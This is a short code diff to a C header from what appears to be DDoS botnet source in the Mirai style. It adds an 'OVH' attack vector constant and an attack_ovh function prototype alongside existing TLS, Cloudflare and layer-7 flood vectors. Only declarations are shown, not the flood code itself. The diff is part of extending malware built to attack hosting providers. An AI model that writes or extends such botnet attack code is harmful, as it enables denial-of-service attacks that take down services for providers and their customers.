@@ -51,6 +51,7 @@ typedef uint8_t ATTACK_VECTOR;
 #define ATK_VEC_TLSPLUS    23 
 #define ATK_VEC_CLOUDFLARE 24 
 #define ATK_VEC_NERV_L7    25 
+#define ATK_VEC_OVH        26 
 
 #define ATK_OPT_PAYLOAD_SIZE    0   
 #define ATK_OPT_PAYLOAD_RAND    1   
@@ -131,6 +132,7 @@ void attack_tls(uint8_t, struct attack_target *, uint8_t, struct attack_option *
 void attack_tlsplus(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
 void attack_cloudflare(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
 void attack_nerv_l7(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
+void attack_ovh(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
 
 static void add_attack(ATTACK_VECTOR, ATTACK_FUNC);
 static void free_opts(struct attack_option *, int);
